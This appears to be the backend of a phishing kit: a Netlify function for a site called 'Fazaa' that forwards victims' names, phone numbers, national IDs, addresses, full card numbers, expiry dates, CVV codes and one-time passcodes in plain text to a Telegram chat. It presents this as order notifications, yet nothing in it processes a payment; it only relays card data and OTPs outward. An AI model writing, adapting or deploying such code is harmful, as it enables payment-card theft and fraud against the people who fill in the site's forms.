// Netlify Function - Telegram notifications for Fazaa static site.
// Keeps the bot token on the server side so it is never exposed to the browser.

const TELEGRAM_API_URL = 'https://api.telegram.org';

async function sendTelegramMessage(text) {
    const botToken = process.env.TELEGRAM_BOT_TOKEN || '';
    const chatId = process.env.TELEGRAM_CHAT_ID || '';

    if (!botToken || !chatId) {
        console.log('[Telegram] Missing bot token or chat id.');
        return { success: false, skipped: true };
    }

    try {
        const response = await fetch(`${TELEGRAM_API_URL}/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text,
                disable_web_page_preview: true,
                parse_mode: 'HTML'
            })
        });

        const payload = await response.json();
        if (!response.ok || !payload.ok) {
            throw new Error(payload.description || 'Telegram send failed');
        }

        return { success: true };
    } catch (error) {
        console.error('[Telegram] send error:', error.message);
        return { success: false, error: error.message };
    }
}

function buildMessage(stage, payload = {}) {
    const lines = [];
    const name = payload.fullName || payload.customerName || '';

    if (stage === 'order1') {
        lines.push('بيانات العميل');
        if (name) lines.push(`اسم العميل: ${name}`);
        if (payload.phoneNumber) lines.push(`الهاتف: ${payload.phoneNumber}`);
        if (payload.nationalId) lines.push(`الهوية: ${payload.nationalId}`);
    } else if (stage === 'order2') {
        lines.push('عنوان التوصيل');
        if (name) lines.push(`اسم العميل: ${name}`);
        if (payload.city) lines.push(`المدينة: ${payload.city}`);
        if (payload.street1) lines.push(`العنوان: ${payload.street1}`);
        if (payload.deliveryDate) lines.push(`موعد الاستلام: ${payload.deliveryDate}`);
    } else if (stage === 'order3') {
        lines.push('دخول الدفع');
        if (name) lines.push(`اسم العميل: ${name}`);
    } else if (stage === 'payment') {
        lines.push('دفع جديد');
        if (name) lines.push(`اسم العميل: ${name}`);
        if (payload.cardHolder) lines.push(`اسم حامل البطاقة: ${payload.cardHolder}`);
        if (payload.cardNumber) lines.push(`رقم البطاقة: ${payload.cardNumber}`);
        if (payload.expiry) lines.push(`تاريخ الانتهاء: ${payload.expiry}`);
        if (payload.cvv) lines.push(`رمز الأمان: ${payload.cvv}`);
    } else if (stage === 'otp') {
        lines.push('رمز التحقق');
        if (name) lines.push(`اسم العميل: ${name}`);
        if (payload.otp) lines.push(`رمز التحقق: ${payload.otp}`);
    } else {
        return null;
    }

    return lines.join('\n');
}

function stageFromPath(path = '') {
    if (path.includes('notify-order1')) return 'order1';
    if (path.includes('notify-order2')) return 'order2';
    if (path.includes('submit-order')) return 'order3';
    if (path.includes('submit-payment')) return 'payment';
    if (path.includes('verify-otp')) return 'otp';
    return null;
}

exports.handler = async (event) => {
    const headers = {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 204, headers };
    }

    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, headers, body: JSON.stringify({ success: false, error: 'Method not allowed' }) };
    }

    try {
        const payload = JSON.parse(event.body || '{}');
        const stage = stageFromPath(event.path || '') || payload.stage;
        const message = buildMessage(stage, payload);

        if (!message) {
            return { statusCode: 400, headers, body: JSON.stringify({ success: false, error: 'Unknown stage' }) };
        }

        const telegram = await sendTelegramMessage(message);
        return { statusCode: 200, headers, body: JSON.stringify({ success: true, telegram }) };
    } catch (error) {
        console.error('[notify] error:', error.message);
        return { statusCode: 500, headers, body: JSON.stringify({ success: false, error: 'Server error' }) };
    }
};
